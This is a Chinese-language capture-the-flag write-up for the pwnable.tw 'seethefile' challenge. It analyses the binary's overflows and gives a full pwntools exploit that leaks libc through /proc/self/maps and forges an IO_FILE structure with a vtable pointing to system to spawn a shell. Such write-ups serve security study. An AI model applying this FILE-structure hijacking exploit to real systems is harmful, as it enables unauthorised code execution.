# pwnable.tw seethefile 

IO_FILE的这种利用方法只能用在GLIBC2.23以前的版本里。

### 0x1 分析

```shell
➜  seethefile checksec seethefile
[*] './seethefile/seethefile'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

我们看到CANARY、PIE都没有开。

看一下程序的逻辑

```c
int menu()
{
  puts("---------------MENU---------------");
  puts("  1. Open");
  puts("  2. Read");
  puts("  3. Write to screen");
  puts("  4. Close");
  puts("  5. Exit");
  puts("----------------------------------");
  return printf("Your choice :");
}
```

打开文件、查看文件、输出文件、关闭文件。

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char nptr; // [esp+Ch] [ebp-2Ch]
  unsigned int v4; // [esp+2Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  init();
  welcome();
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%s", &nptr);                // stack overflow
    switch ( atoi(&nptr) )
    {
      case 1:
        openfile();
        break;
      case 2:
        readfile();
        break;
      case 3:
        writefile();
        break;
      case 4:
        closefile();
        break;
      case 5:
        printf("Leave your name :");
        __isoc99_scanf("%s", &name);		 // stack overflow
        printf("Thank you %s ,see you next time\n", &name);
        if ( fp )
          fclose(fp);
        exit(0);
        return;
      default:
        puts("Invaild choice");
        exit(0);
        return;
    }
  }
}
```

`main`里面有两个任意长度写的地方。但是在打开文件的时候会过滤，所以不能直接打开`flag`。

####  漏洞利用

通过查看`/proc/self/maps`文件可以泄漏`libc`地址。（类似vmmap)。

然后通过`name`那里的任意长度写，修改`fp`为我们伪造的`IO_FILE`的地址，使其`vtable->__finish`指向`system`来拿到shell。

###  0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'i386' , os = 'linux', log_level='debug')

p = process(['/pwn/ld/2.23/ld-2.23-32.so', './seethefile'], env={'LD_PRELOAD':'./libc_32.so.6'})
elf = ELF('./seethefile')
libc = ELF("./libc_32.so.6")

# p = remote('chall.pwnable.tw', 10200)
# elf = ELF('./seethefile')
# libc = ELF("./libc_32.so.6")

p.sendlineafter('Your choice :', '1')
p.sendlineafter('What do you want to see :', '/proc/self/maps')

p.sendlineafter('Your choice :', '2')
p.sendlineafter('Your choice :', '3')

p.sendlineafter('Your choice :', '2')
p.sendlineafter('Your choice :', '3')

p.recvline()
p.recvline()
libc.address = int(p.recvuntil('-')[:-1], 16)
log.success('libc_addr: ' + hex(libc.address))

p.sendlineafter('Your choice :', '4')

# Forge FILE struct
# openfile('/proc/self/maps')  # open fd to trigger fclose
p.sendlineafter('Your choice :', '1')
p.sendlineafter('What do you want to see :', '/proc/self/maps')

fake_file_addr = 0x0804B300 

payload = 'a' * 0x20 + p32(fake_file_addr)
payload += '\x00' * (0x0804B300 - 0x0804B280 - 4)
# fake IO file struct  (size is 0x94)
# padding header with 0xFFFFDFFF and arg string
# the ||/bin/sh string is same as ;$0
payload += '\xff\xff\xdf\xff;$0\x00'.ljust(0x94, '\x00')

# Forged vtable is designed on 0x0804B300+0x98 (next to the fake IO file)
payload += p32(fake_file_addr + 0x98)
payload += p32(libc.sym['system']) * 21

p.sendlineafter('Your choice :', '5')
p.sendlineafter('Leave your name :', payload)

p.interactive()
# gdb.attach(p)#
```

### 0x3 Reference

[[pwnable.tw]seethefile [IOFILE学习--fclose]](https://www.jianshu.com/p/0176ebe02354)

